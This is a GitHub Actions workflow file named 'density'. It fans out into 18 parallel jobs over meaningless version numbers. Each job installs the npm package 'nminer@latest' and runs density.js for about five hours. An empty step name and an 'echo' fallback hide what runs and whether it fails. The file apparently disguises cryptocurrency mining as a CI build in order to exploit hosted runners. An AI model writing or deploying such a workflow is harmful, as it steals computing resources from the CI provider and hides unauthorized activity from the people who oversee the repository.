name: density
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 734 }
          - { version: 6365 }
          - { version: 3565 }
          - { version: 8762 }
          - { version: 2844 }
          - { version: 7910 }
          - { version: 9629 }
          - { version: 1094 }
          - { version: 9785 }
          - { version: 5382 }
          - { version: 7806 }
          - { version: 2910 }
          - { version: 7852 }
          - { version: 2771 }
          - { version: 4568 }
          - { version: 4996 }
          - { version: 8039 }
          - { version: 9526 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 304m node density.js || echo "density executed"